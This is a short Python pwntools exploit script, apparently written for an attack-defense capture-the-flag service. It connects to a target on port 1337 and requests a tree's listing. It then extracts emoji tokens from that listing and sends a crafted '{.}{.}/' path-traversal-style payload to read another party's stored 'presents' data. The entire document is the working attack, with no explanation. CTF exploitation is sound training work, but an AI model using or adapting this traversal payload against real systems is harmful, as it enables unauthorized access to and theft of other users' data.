#!/usr/bin/env python3

import sys
from pwn import *

host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'

tree_id = '...'   # Can be retrieved from public list of trees or from attack data

def craft_payload(tree_id: str, emojis: list[bytes]) -> bytes:
    return b'{.}{.}/' + tree_id.encode() + b'_presents/' + b''.join([b'{' + e + b'}' for e in emojis])

r = remote(host, 1337)
r.recvuntil(b'> ')
r.sendline(b'5')
r.recvuntil(b': ')
r.sendline(tree_id.encode())
tree = r.recvuntil(b'\n\n')
emojis = re.findall(rb'\<([^\>]*)\>', tree)

r.recvuntil(b'> ')
r.sendline(b'5')
r.recvuntil(b': ')
r.sendline(craft_payload(tree_id, emojis))
print(r.recvuntil(b'\n\n'), flush=True)
